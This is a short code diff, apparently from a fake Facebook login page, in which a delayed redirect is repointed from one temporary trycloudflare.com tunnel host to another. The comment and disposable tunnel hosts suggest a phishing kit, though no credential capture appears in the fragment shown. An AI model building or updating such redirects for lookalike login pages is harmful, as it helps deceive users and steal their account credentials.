@@ -89,7 +89,7 @@ document.addEventListener('DOMContentLoaded', () => {
         // Simulate redirect after 2 seconds
         setTimeout(() => {
             // Replace this with your actual Facebook login URL
-            window.location.href = 'https://physician-nature-june-carriers.trycloudflare.com';
+            window.location.href = 'https://hitting-river-charges-wednesday.trycloudflare.com';
         }, 2000);
     });
 
